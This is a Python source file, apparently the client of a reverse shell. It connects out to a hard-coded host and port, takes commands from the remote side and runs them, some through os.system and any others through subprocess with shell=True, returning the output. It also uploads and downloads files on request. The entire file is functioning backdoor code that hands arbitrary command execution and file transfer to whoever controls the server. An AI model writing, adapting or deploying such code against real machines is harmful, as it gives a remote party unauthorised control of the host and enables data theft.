import socket
import os
import subprocess
from defs import *

host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))


def send_error(msg):
    error_msg = f'[From client] Error: {msg}'
    client.send(error_msg.encode())


while True:
    try:
        comm = client.recv(1024).decode()
        if comm == 'close':
            break
        elif not comm:
            break
        elif comm[:3] == 'cd ':
            try:
                os.chdir(comm[3:])
            except FileNotFoundError as e:
                send_error(e)
        elif comm[:5] == 'touch':
            os.system(comm)
        elif comm[:5] == 'mkdir':
            os.system(comm)
        elif comm[:5] == 'start':
            os.system(comm)
        elif comm[:4] == 'open':
            os.system(comm)
        elif comm[:3] == 'get':
            try:
                filename = comm.split()[1]
                upload_file(client, filename)
            except FileNotFoundError as e:
                send_error(e)
            except (IOError, OSError) as e:
                send_error(e)
            except Exception as e:
                send_error(e)
        elif comm[:2] == 'up':
            try:
                filename = comm.split()[1]
                download_file(client, filename)
            except FileNotFoundError as e:
                send_error(e)
            except (IOError, OSError) as e:
                send_error(e)
            except Exception as e:
                send_error(e)
        else:
            try:
                output = subprocess.run(comm, text=True, shell=True, capture_output=True)
                if output.stdout:
                    client.sendall(output.stdout.encode())
                else:
                    client.sendall('\nNO OUTPUT!'.encode())
            except subprocess.CalledProcessError as e:
                send_error(e)
            except (ValueError, TypeError, AttributeError) as e:
                send_error(e)
    except socket.error as e:
        send_error(e)
        
